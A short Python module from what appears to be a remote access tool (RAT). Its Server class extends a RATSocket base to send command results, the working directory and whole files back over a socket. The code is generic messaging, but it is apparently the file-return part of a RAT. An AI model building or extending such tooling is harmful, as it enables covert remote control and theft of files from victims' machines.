import ntpath
import os

from common.ratsocket import RATSocket
from common.util import get_read_stream


class Server(RATSocket):

    def __init__(self):
        super().__init__()

    def send_result(self, status, result, id, eof=1):
        body = result.encode()
        head = {
            'id': id,
            'type': 'result',
            'length': len(body),
            'status': status,
            'eof': eof,
            'cwd': os.getcwd()
        }
        self.send(head, bytes=body)

    def send_file(self, filename, id):
        head = {
            'id': id,
            'type': 'file',
            'length': os.stat(filename).st_size,
            'filename': ntpath.basename(filename),
            'cwd': os.getcwd(),
        }
        self.send(head, file_stream=get_read_stream(filename))
